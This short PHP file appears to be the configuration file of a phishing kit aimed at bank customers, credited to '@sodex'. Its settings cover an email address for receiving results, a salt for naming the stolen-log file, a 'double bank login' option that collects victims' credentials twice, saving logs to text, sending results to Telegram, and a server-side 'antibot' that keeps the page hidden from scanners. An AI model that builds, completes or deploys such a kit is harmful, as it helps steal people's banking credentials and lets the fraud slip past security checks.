<?php

// ------------------------------------------------- //
  #                BY: @sodex                     #
  #################################################
// -------------------------------------------------//


//important details
$emailzz = ""; // your email
$salt = ""; // File name to secure logs

//important on/off
$d_log = "off"; // double bank login
$savetxt = "off"; // to turn on/off save log txt file

$tgresult = "on"; // to get result on tg

// to turn zsec(server side antibot) off goto zsec-config.php
?>